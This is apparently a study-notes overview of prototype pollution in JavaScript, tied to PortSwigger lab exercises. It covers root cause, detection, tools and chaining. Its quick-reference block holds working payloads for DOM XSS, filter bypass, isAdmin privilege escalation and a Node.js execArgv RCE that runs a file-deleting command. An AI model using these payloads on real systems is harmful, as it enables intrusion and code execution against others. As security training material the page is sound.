# Prototype pollution — topic overview & router

Prototype pollution lets an attacker inject arbitrary properties into `Object.prototype` via user-controlled paths (`__proto__`, `constructor.prototype`, dot-notation). Every object inherits from `Object.prototype`, so injected properties become visible on every subsequently created object — enabling DOM XSS via gadgets (client-side) or privilege escalation, RCE, and data exfiltration (server-side Node.js).

## 30-second quick reference

```
# Client-side — test sources
/?__proto__[foo]=bar          # bracket notation
/?__proto__.foo=bar           # dot notation
/#__proto__[foo]=bar          # URL fragment
/?constructor.prototype.foo=bar

# Confirm in DevTools console
Object.prototype               # look for injected foo property

# Exploit DOM gadget (transport_url → script src)
/?__proto__[transport_url]=data:,alert(1)

# Sanitizer bypass (double-nested)
/?__pro__proto__to__[transport_url]=data:,alert(1)

# Server-side — detect (non-destructive probes)
{"__proto__":{"status":555}}           # → server returns 555 status codes
{"__proto__":{"json spaces":10}}       # → JSON responses indented 10 spaces

# Server-side — privilege escalation
{"address":"x","__proto__":{"isAdmin":true}}

# Filter bypass (constructor.prototype)
{"address":"x","constructor":{"prototype":{"isAdmin":true}}}

# Node.js RCE (execArgv gadget)
{"__proto__":{"execArgv":["--eval=process.mainModule.require('child_process').execSync('rm /home/carlos/morale.txt')"]}}
```

## Decision map

| Observation | Sub-technique | Attack |
|---|---|---|
| Query string or hash controls object properties | [Client-side](Client-side/) | `__proto__[gadget]=payload` → DOM XSS |
| Sanitizer strips `__proto__` or `constructor` | [Advanced-bypass](Advanced-bypass/) | double-nested: `__pro__proto__to__` |
| JSON body accepted by server, reflected in response | [Server-side](Server-side/) | `__proto__` → isAdmin, RCE, exfil |
| Server-side PP confirmed, `__proto__` filtered | [Advanced-bypass](Advanced-bypass/) | `constructor.prototype` vector |
| Need to confirm server-side PP without reflecting | [Server-side](Server-side/) | status 555 / json-spaces / charset override |

## Sub-technique folders

- `Client-side/` — browser DOM PP via query string/fragment, DOM XSS gadgets (Labs 1–5)
- `Server-side/` — Node.js PP via JSON body, privilege escalation, RCE, data exfil (Labs 6,7,9,10)
- `Advanced-bypass/` — input filter bypass via constructor.prototype / double-nested __proto__ (Lab 8)

## Root cause

JavaScript objects share a prototype chain. `obj.__proto__` is a reference to `Object.prototype`. If user input is merged into an object using recursive merge / `lodash.merge` / `Object.assign` without sanitizing `__proto__` as a key, properties flow up to the shared prototype and become available on every object.

## Find it

- **Client-side:** inject `/?__proto__[foo]=bar`; open DevTools → Console → `Object.prototype` → look for `foo`. Try all three vectors (bracket, dot, hash).
- **Server-side:** add `"__proto__":{"status":555}` to any JSON body → check if subsequent responses return 555. Also test `json spaces:10` and charset override.
- **DOM Invader** (Burp built-in browser): enable prototype pollution scanning → reload page → see detected sources and gadgets automatically.

## Chaining

- Client-side PP → DOM XSS → [XSS/Exploiting-XSS](../XSS/Exploiting-XSS/)
- Server-side PP → isAdmin → [Access-control](../Access-control/)
- Server-side PP RCE → OS command execution → [OS-command-injection](../OS-command-injection/)
- PP combined with SSRF for data exfil → [SSRF](../SSRF/)

## Tools

- **DOM Invader** — auto-scan for client-side PP sources and gadgets
- **Param Miner** — server-side PP probing (status override, json-spaces, charset)
- **Burp Repeater** — manual JSON PP injection and response analysis
- **Burp Collaborator** — confirm out-of-band RCE / data exfiltration

## References

- https://portswigger.net/web-security/prototype-pollution
- https://portswigger.net/web-security/prototype-pollution/client-side
- https://portswigger.net/web-security/prototype-pollution/server-side
